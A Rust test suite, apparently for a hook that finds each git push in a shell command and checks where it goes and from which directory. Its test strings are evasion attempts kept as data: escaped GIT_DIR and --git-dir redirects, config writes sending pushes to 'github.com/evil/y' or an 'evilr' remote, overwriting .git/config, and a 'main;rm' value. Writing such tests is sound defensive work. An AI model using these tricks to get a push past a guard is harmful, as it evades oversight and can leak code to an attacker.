        // Control: the unescaped spelling already refused.
        assert!(only("cd - ; git push origin main", "/repo").unresolved);
    }

    #[test]
    fn an_escaped_exported_redirect_marks_the_whole_scope() {
        // `export`/`declare`/`typeset` are builtins whose OPERANDS the shell
        // unescapes before they see them — measured, `export GIT_\DIR=/nope`
        // then `git rev-parse --git-dir` answers `not a git repository:
        // '/nope'` under bash, zsh and sh. The `exported` arm tested them raw,
        // so the redirect was invisible and every later push in the scope
        // reported `unresolved: false` against the session's own checkout.
        for command in [
            "export GIT_DIR=/x ; git push origin main",
            "export GIT_\\DIR=/x ; git push origin main",
            "typeset GIT_\\DIR=/x ; git push origin main",
            "declare -x GIT_\\DIR=/x ; git push origin main",
            "declare -x GIT_DIR=/x ; git push origin main",
        ] {
            assert!(only(command, "/repo").unresolved, "{command:?}");
        }
        // Control, and it is why `assignment_only` stays RAW: a bare escaped
        // assignment segment is honoured by no shell, so seeing no push is the
        // right answer.
        assert!(push_invocations("GIT_\\DIR=/x git push origin main", "/repo").is_empty());
    }

    #[test]
    fn a_runner_behind_a_prefix_still_skips_its_assignments() {
        // The gate read `tokens[0]`, but the runner is not always first: any
        // transparent prefix in front of it turned the gate off while the peel
        // still happened, leaving `argv[0]` as the assignment word itself.
        // Measured: `exec env GIT_\DIR=/nope git rev-parse --git-dir` answers
        // `not a git repository: '/nope'` under bash, zsh and sh.
        for command in [
            "exec env GIT_\\DIR=/x git push origin main",
            "command env GIT_\\DIR=/x git push origin main",
            "nohup env GIT_\\DIR=/x git push origin main",
        ] {
            assert!(only(command, "/repo").unresolved, "{command:?}");
        }
        // Controls: with no runner anywhere in the peeled region the bare-prefix
        // refusal must survive — no shell honours an escaped assignment prefix.
        assert!(push_invocations("GIT_\\DIR=/x git push origin main", "/repo").is_empty());
        assert!(push_invocations("GIT_CONFIG_\\COUNT=1 git push origin main", "/repo").is_empty());
    }

    #[test]
    fn an_eval_in_command_position_refuses_the_directory() {
        // `eval cd /other` moves bash, zsh and sh (measured), and `eval` is
        // peeled by nothing — so `directory_verb` answered `None`, meaning "not
        // a directory verb at all", the caller kept the STALE directory, and the
        // later push reported `/repo` with `unresolved: false`. That is the one
        // combination this module exists to prevent.
        let invocation = only("eval cd /other ; git push origin main", "/repo");
        assert!(invocation.unresolved);
        // Controls, all measured: these do NOT move the shell, so the walk is
        // right to keep the directory and stay resolved.
        for command in [
            "exec cd /other ; git push origin main",
            "env cd /other ; git push origin main",
            "nice cd /other ; git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert_eq!(invocation.work_dir, "/repo", "{command:?}");
            assert!(!invocation.unresolved, "{command:?}");
        }
        // `builtin builtin cd` DOES move, and still resolves.
        assert_eq!(
            only("builtin builtin cd /other ; git push origin main", "/repo").work_dir,
            "/other"
        );
    }

    #[test]
    fn an_escaped_git_global_is_read_like_its_unescaped_control() {
        // The shell removes the escape before git sees the word — measured,
        // `git --git-\dir=/nonexistent rev-parse` reports
        // `not a git repository: '/nonexistent'`. `git_globals` compared the raw
        // token, so a redirect went unflagged and an escaped `-C` was not even
        // seen as a push.
        //
        // Redirect flags: unresolved, exactly like the unescaped control.
        for command in [
            "git --git-dir=/x push origin main",
            "git --git-\\dir=/x push origin main",
            "git --work-tree=/x push origin main",
            "git --work-\\tree=/x push origin main",
        ] {
            assert!(
                only(command, "/repo").unresolved,
                "should refuse: {command}"
            );
        }
        // `-C` in either escaped spelling is still a push, and still redirects.
        for command in [
            "git -\\C /other push origin main",
            "git \\-C /other push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert_eq!(invocation.work_dir, "/other", "for {command}");
            assert_eq!(
                invocation.refspecs[0].source.as_deref(),
                Some("main"),
                "for {command}"
            );
        }
        // A config override reaches `push.default` through either escape.
        for command in [
            "git -c push.\\default=matching push origin",
            "git -\\c push.default=matching push origin",
            "git --config-\\env=push.default=P push origin",
        ] {
            assert!(
                only(command, "/repo").unresolved,
                "should refuse: {command}"
            );
        }
        // Control: an escaped global that names no redirect stays resolvable.
        assert!(!only("git -\\c color.ui=never push origin", "/repo").unresolved);
    }

    #[test]
    fn a_backslash_bearing_word_that_is_not_a_directory_verb_is_ignored() {
        // The refusal is scoped to tokens that could BE a directory verb.
        let invocation = only("ec\\ho hi && git push origin main", "/repo");
        assert_eq!(invocation.work_dir, "/repo");
        assert!(!invocation.unresolved);
    }

    #[test]
    fn a_backslash_in_an_operand_is_left_alone() {
        // Only the VERB is unescaped. An operand keeps its backslash, so a
        // refspec carrying one fails `is_safe_ref` and refuses — the safe
        // direction, and the honest statement of what this walk models.
        let invocation = only("git push origin ma\\in", "/repo");
        assert_eq!(invocation.refspecs[0].source.as_deref(), Some("ma\\in"));
        assert!(!is_safe_ref("ma\\in"));
    }

    #[test]
    fn redirections_are_not_counted_as_operands() {
        // `pushd <dir> >/dev/null` is how the idiom is normally written, and
        // the operand count was reading the redirect as a second operand.
        for command in [
            "pushd /other >/dev/null && git push origin main",
            "cd /other 2>/dev/null && git push origin main",
            "cd /other > log 2>&1 && git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert_eq!(invocation.work_dir, "/other", "for {command}");
            assert!(!invocation.unresolved, "for {command}");
        }
    }

    #[test]
    fn env_prefixed_cd_does_not_move_the_work_dir() {
        // Measured: `bash -c 'cd /tmp; env cd /usr; pwd'` prints `/tmp`. `env`
        // execs a CHILD, so the parent shell never moves — the push after it
        // runs in the original directory, and saying so is the correct answer.
        let invocation = only("env cd /other && git push origin main", "/repo");
        assert_eq!(invocation.work_dir, "/repo");
        assert!(!invocation.unresolved);
    }

    #[test]
    fn an_uppercase_or_path_qualified_cd_is_not_a_directory_verb() {
        // `cd` is a shell BUILTIN, so neither case-folding nor basename
        // stripping applies to it. Measured: `CD /usr` and `/usr/bin/cd /usr`
        // both leave bash in the original directory. Treating either as a move
        // would report a directory the shell never entered.
        for command in [
            "CD /other && git push origin main",
            "/usr/bin/cd /other && git push origin main",
        ] {
            let invocation = only(command, "/repo");
            assert_eq!(invocation.work_dir, "/repo", "for {command}");
            assert!(!invocation.unresolved, "for {command}");
        }
    }

    #[test]
    fn pushd_with_any_flag_marks_every_later_push_unresolved() {
        // `pushd -n /b` pushes onto the stack WITHOUT moving (measured: `pwd`
        // stays at `/a`). Enumerating which pushd flags move is the wrong side
        // of that problem, so any flag refuses.
        assert!(only("pushd -n /other && git push origin main", "/repo").unresolved);
    }

    #[test]
    fn a_two_operand_cd_marks_every_later_push_unresolved() {
        // `cd <old> <new>` is bash's substitute form, not a move to `<old>`.
        // Measured: `cd repo other` errors and does not move.
        assert!(only("cd repo other && git push origin main", "/repo").unresolved);
    }

    #[test]
    fn git_config_parameters_env_marks_the_invocation_unresolved() {
        // git honours this one standalone — no GIT_CONFIG_COUNT needed:
        // `GIT_CONFIG_PARAMETERS="'push.default=matching'" git config --get
        // push.default` prints `matching`.
        assert!(
            only(
                "GIT_CONFIG_PARAMETERS='push.default=matching' git push origin",
                "/repo"
            )
            .unresolved
        );
    }

    #[test]
    fn pushd_stack_rotation_marks_every_later_push_unresolved() {
        // `pushd +N`/`-N` rotate the directory stack, which this walk never
        // modelled. Measured: after two pushds, `pushd +1` really does move.
        assert!(only("pushd +1 && git push origin main", "/repo").unresolved);
        assert!(only("pushd -0 && git push origin main", "/repo").unresolved);
    }

    #[test]
    fn pushd_with_a_literal_path_moves_the_work_dir() {
        let invocation = only("pushd /x && git push origin main", "/repo");
        assert_eq!(invocation.work_dir, "/x");
        assert!(!invocation.unresolved);
    }

    #[test]
    fn popd_marks_every_later_push_unresolved() {
        // `popd` returns to a directory this walk never recorded.
        assert!(only("popd && git push origin main", "/repo").unresolved);
        assert!(only("pushd && git push origin main", "/repo").unresolved);
    }

    #[test]
    fn a_resolvable_cd_still_leaves_a_later_push_resolved() {
        // The control for the two tests above: a literal target must not start
        // marking pushes unresolved.
        let invocation = only("cd /other && git push origin main", "/repo");
        assert_eq!(invocation.work_dir, "/other");
        assert!(!invocation.unresolved);
    }

    #[test]
    fn tags_flag_widens_the_ref_set_and_follow_tags_does_not() {
        // `--tags` publishes every ref under refs/tags, and a tag can point at
        // a commit no branch reaches — so HEAD's range is not the answer.
        let tagged = only("git push --tags origin", "/repo");
        assert!(tagged.tags);
        assert!(!tagged.all_or_mirror);
        // `--follow-tags` only pushes tags reachable from the pushed commits.
        let followed = only("git push --follow-tags origin main", "/repo");
        assert!(!followed.tags);
        assert!(!only("git push origin main", "/repo").tags);
    }

    #[test]
    fn mirror_follow_tags_and_recurse_submodules_are_recorded() {
        for (command, mirror, follow, recurse) in [
            ("git push origin main", false, None, None),
            ("git push --mirror origin", true, None, None),
            ("git push --mirr origin", true, None, None),
            ("git push --all origin", false, None, None),
            (
                "git push --follow-tags origin main",
                false,
                Some(true),
                None,
            ),
            (
                "git push --follow-tags --no-follow-tags origin main",
                false,
                Some(false),
                None,
            ),
            (
                "git push --recurse-submodules=on-demand origin main",
                false,
                None,
                Some("on-demand"),
            ),
            (
                "git push --recurse-submodules check origin main",
                false,
                None,
                Some("check"),
            ),
            (
                "git push --no-recurse-submodules origin main",
                false,
                None,
                Some("no"),
            ),
        ] {
            let found = only(command, "/repo");
            assert_eq!(found.mirror, mirror, "{command}");
            assert_eq!(found.follow_tags, follow, "{command}");
            assert_eq!(found.recurse_submodules.as_deref(), recurse, "{command}");
        }
        // The value word is still consumed, so it is not read as a refspec.
        let found = only("git push --recurse-submodules check origin main", "/repo");
        assert_eq!(found.repository.as_deref(), Some("origin"));
    }

    #[test]
    fn branches_and_follow_tags_abbreviations_are_read_like_git() {
        // `--branches` is an alias of `--all`; `--b` is unique among push's
        // options. `--fo`/`--no-fo` are ambiguous with `--force-if-includes`
        // (git refuses them), so `--fol`/`--no-fol` are the shortest spellings.
        for (command, all, follow) in [
            ("git push --branches origin", true, None),
            ("git push --br origin", true, None),
            ("git push --b origin", true, None),
            ("git push --fol origin main", false, Some(true)),
            ("git push --follow origin main", false, Some(true)),
            ("git push --no-fol origin main", false, Some(false)),
            ("git push --no-follow-t origin main", false, Some(false)),
            ("git push --fo origin main", false, None),
            ("git push --no-fo origin main", false, None),
            ("git push --force origin main", false, None),
        ] {
            let found = only(command, "/repo");
            assert_eq!(found.all_or_mirror, all, "{command}");
            assert_eq!(found.follow_tags, follow, "{command}");
            assert!(!found.mirror, "{command}");
        }
    }

    #[test]
    fn two_pushes_in_one_chain_are_both_reported() {
        let found = push_invocations(
            "git push origin main; git -C /other push origin topic",
            "/repo",
        );
        assert_eq!(found.len(), 2);
        assert_eq!(found[0].work_dir, "/repo");
        assert_eq!(found[1].work_dir, "/other");
        assert_eq!(found[1].refspecs[0].source.as_deref(), Some("topic"));
    }

    #[test]
    fn is_safe_ref_rejects_flag_shaped_and_expansion_refs() {
        assert!(is_safe_ref("HEAD"));
        assert!(is_safe_ref("refs/heads/topic-1.2"));
        assert!(!is_safe_ref("--output=/tmp/x"));
        assert!(!is_safe_ref("-n"));
        assert!(!is_safe_ref("$BRANCH"));
        assert!(!is_safe_ref("a..b"));
        assert!(!is_safe_ref("main;rm"));
        assert!(!is_safe_ref(""));
        assert!(!is_safe_ref("topic.lock"));
    }

    #[test]
    fn push_default_matching_marks_an_implicit_refspec_unresolved() {
        // `push.default=matching` publishes every same-named local branch, HEAD
        // or not, so the implicit HEAD refspec is not what git would push.
        let scratch = Scratch::new(&scratch_root(), "push-default-matching");
        let repo = scratch.path();
        init_repo(repo);
        git_in(repo, &["config", "push.default", "matching"]);

        let invocation = only("git push origin", &repo.to_string_lossy());
        assert!(invocation.refspecs[0].implicit);
        assert!(invocation.unresolved);
    }

    #[test]
    fn push_default_simple_leaves_an_implicit_refspec_resolved() {
        let scratch = Scratch::new(&scratch_root(), "push-default-simple");
        let repo = scratch.path();
        init_repo(repo);
        git_in(repo, &["config", "push.default", "simple"]);

        let invocation = only("git push origin", &repo.to_string_lossy());
        assert!(invocation.refspecs[0].implicit);
        assert!(!invocation.unresolved);
    }

    #[test]
    fn a_configured_remote_push_refspec_marks_an_implicit_refspec_unresolved() {
        let scratch = Scratch::new(&scratch_root(), "remote-push-refspec");
        let repo = scratch.path();
        init_repo(repo);
        git_in(
            repo,
            &["config", "remote.origin.push", "refs/heads/*:refs/heads/*"],
        );

        assert!(only("git push origin", &repo.to_string_lossy()).unresolved);
    }

    #[test]
    fn an_explicit_refspec_is_unaffected_by_push_default_matching() {
        // Named refspecs replace the push.default computation entirely, so the
        // config question never arises and no git call is made.
        let scratch = Scratch::new(&scratch_root(), "explicit-beats-matching");
        let repo = scratch.path();
        init_repo(repo);
        git_in(repo, &["config", "push.default", "matching"]);

        let invocation = only("git push origin main", &repo.to_string_lossy());
        assert!(!invocation.refspecs[0].implicit);
        assert!(!invocation.unresolved);
    }

    #[test]
    fn outbound_commits_on_a_first_push_with_no_upstream_is_non_empty() {
        // The regression guard for the argument-order bug: with no
        // `refs/remotes/*` at all, the range is the whole history. The reversed
        // spelling returns empty here, which reads as "nothing to push".
        let scratch = Scratch::new(&scratch_root(), "first-push");
        let repo = scratch.path();
        init_repo(repo);
        std::fs::write(repo.join("second.txt"), "x").unwrap();
        git_in(repo, &["add", "second.txt"]);
        git_in(repo, &["commit", "-q", "-m", "second"]);

        let range = outbound_commits(&repo.to_string_lossy(), "HEAD");
        match range {
            OutboundRange::Commits(commits) => assert_eq!(commits.len(), 2),
            other => panic!("expected commits, got {other:?}"),
        }
    }

    #[test]
    fn outbound_commits_is_empty_when_everything_is_already_on_a_remote() {
        let scratch = Scratch::new(&scratch_root(), "already-pushed");
        let remote = scratch.path().join("remote.git");
        let work = scratch.path().join("work");
        std::fs::create_dir_all(&remote).unwrap();
        std::fs::create_dir_all(&work).unwrap();
        git_in(&remote, &["init", "-q", "--bare", "-b", "main"]);
        init_repo(&work);
        git_in(
            &work,
            &["remote", "add", "origin", &remote.to_string_lossy()],
        );
        git_in(&work, &["push", "-q", "origin", "main"]);

        assert_eq!(
            outbound_commits(&work.to_string_lossy(), "main"),
            OutboundRange::Commits(Vec::new())
        );
    }

    #[test]
    fn outbound_commits_reports_unresolved_for_an_unknown_ref() {
        let scratch = Scratch::new(&scratch_root(), "unknown-ref");
        let repo = scratch.path();
        init_repo(repo);

        assert_eq!(
            outbound_commits(&repo.to_string_lossy(), "no-such-branch"),
            OutboundRange::Unresolved
        );
    }

    #[test]
    fn git_output_detailed_separates_an_empty_answer_from_an_error() {
        let scratch = Scratch::new(&scratch_root(), "empty-vs-error");
        let repo = scratch.path();
        init_repo(repo);
        let dir = repo.to_string_lossy();

        // git exits 0 with nothing to say — a real answer, not a failure.
        assert_eq!(
            git_output_detailed(&dir, &["rev-list", "HEAD", "--not", "HEAD", "--"]),
            GitOutput::Ok(String::new())
        );
        // git exits non-zero — the caller must not read this as "empty".
        assert_eq!(
            git_output_detailed(&dir, &["rev-list", "no-such-ref", "--"]),
            GitOutput::Failed
        );
    }

    /// cadence-hooks#1156: `(command, config_destinations, config_remotes,
    /// destination_unreadable)` for the command's LAST push.
    #[test]
    fn an_earlier_config_write_is_reported_on_a_later_push() {
        let evil = "https://github.com/evil/y";
        for (command, urls, remotes, unreadable) in [
            (
                "git remote set-url --push origin https://github.com/evil/y && git push origin main",
                vec![evil],
                vec![],
                false,
            ),
            (
                "git remote add -t main x https://github.com/evil/y; git push x main",
                vec![evil],
                vec![],
                false,
            ),
            (
                "git config --local --add remote.origin.pushurl https://github.com/evil/y; git push",
                vec![evil],
                vec![],
                false,
            ),
            (
                "git config remote.pushDefault evilr && git push",
                vec![],
                vec!["evilr"],
                false,
            ),
            (
                "git config branch.main.pushRemote evilr && git push",
                vec![],
                vec!["evilr"],
                false,
            ),
            (
                "git -c branch.main.remote=evilr push",
                vec![],
                vec!["evilr"],
                false,
            ),
            (
                "git config --file x.cfg --unset branch.main.remote && git push",
                vec![],
                vec![],
                true,
            ),
            (
                "git config rename-section remote.a remote.origin && git push",
                vec![],
                vec![],
                true,
            ),
            (
                "git config include.path /x.cfg && git push",
                vec![],
                vec![],
                true,
            ),
            (
                "git config --weird v remote.origin.url https://github.com/evil/y && git push",
                vec![],
                vec![],
                true,
            ),
            (
                "git remote rename a origin && git push origin main",
                vec![],
                vec![],
                true,
            ),
            (
                "git remote add x \"$U\" && git push x main",
                vec![],
                vec![],
                true,
            ),
            ("cp evil.cfg .git/config && git push", vec![], vec![], true),
            ("printf x >~/.gitconfig && git push", vec![], vec![], true),
            // A redirect glued to the word before it (coordinator review).
            (
                "echo x>>.git/config && git push origin main",
                vec![],
                vec![],
                true,
            ),
            ("echo x>.git/config; git push", vec![], vec![], true),
            ("printf x>>~/.gitconfig && git push", vec![], vec![], true),
            ("echo x&>.git/config; git push", vec![], vec![], true),
            // A runner that can run its script again after the write.
            (
                "seq 2 | xargs -I{} sh -c 'git push origin main; git config remote.pushDefault evilr'",
                vec![],
                vec!["evilr"],
                false,
            ),
            (
                "find . -exec true \\; ; git push; git config remote.pushDefault evilr",
                vec![],
                vec!["evilr"],
                false,
            ),
            (
                "watch 'git push origin main; git config remote.pushDefault evilr'",
                vec![],
                vec!["evilr"],
                false,
            ),
            (
                "echo x > \"$GIT_DIR/config\" && git push",
                vec![],
                vec![],
                true,
            ),
            (
                "while true; do git push origin main; git config remote.pushDefault evilr; done",
                vec![],
                vec!["evilr"],
                false,
            ),
            // Controls: reads, unrelated keys and files, and a write after
            // the push in straight-line order.
            (
                "git remote -v && git remote show origin && git push",
                vec![],
                vec![],
                false,
            ),
            (
                "git config get remote.origin.url && git config -l && git push",
                vec![],
                vec![],
                false,
            ),
            (
                "git config user.name x && git config --unset user.email && git push",
                vec![],
                vec![],
                false,
            ),
            (
                "cat .git/config && grep url .git/config && git push",
                vec![],
                vec![],
                false,
            ),
            (
                "echo x > config.json && cp a b && git push",
                vec![],
                vec![],
                false,
            ),
            (
                "git push; git remote add upstream https://github.com/evil/y",
                vec![],
                vec![],
                false,
            ),
            ("echo \"a>b\" && git push", vec![], vec![], false),
            ("git push 2>&1 | tee log", vec![], vec![], false),
            (
                "git push origin main 2>err.log; git config remote.pushDefault evilr",
                vec![],
                vec![],
                false,
            ),
        ] {
            let pushes = push_locations(command, "/r");
            let push = pushes
                .last()
                .unwrap_or_else(|| panic!("no push in {command}"));
            let urls: Vec<String> = urls.into_iter().map(String::from).collect();
            let remotes: Vec<String> = remotes.into_iter().map(String::from).collect();
            assert_eq!(push.config_destinations, urls, "{command}");
            assert_eq!(push.config_remotes, remotes, "{command}");
            assert_eq!(push.destination_unreadable, unreadable, "{command}");
        }
    }

    /// A function body glued to its head (`f(){ …`) is walked like the spaced
    /// spelling (cadence-hooks#1156).
    #[test]
    fn a_function_body_is_walked_whatever_its_spacing() {
        for command in [
            "f(){ git -C /other push origin main; }; f",
            "f() { git -C /other push origin main; }; f",
            "function f { git -C /other push origin main; }; f",
            "function f(){ git -C /other push origin main; }; f",
            "f()(git -C /other push origin main); f",
        ] {
            let dirs: Vec<String> = push_locations(command, "/r")
                .into_iter()
                .map(|push| push.work_dir)
                .collect();
            assert_eq!(dirs, ["/other"], "{command}");
        }
        // Not a function head.
        for command in ["echo f(x) && git push", "x=(a) && git push"] {
            let dirs: Vec<String> = push_locations(command, "/r")
                .into_iter()
                .map(|push| push.work_dir)
                .collect();
            assert_eq!(dirs, ["/r"], "{command}");
        }
    }
}
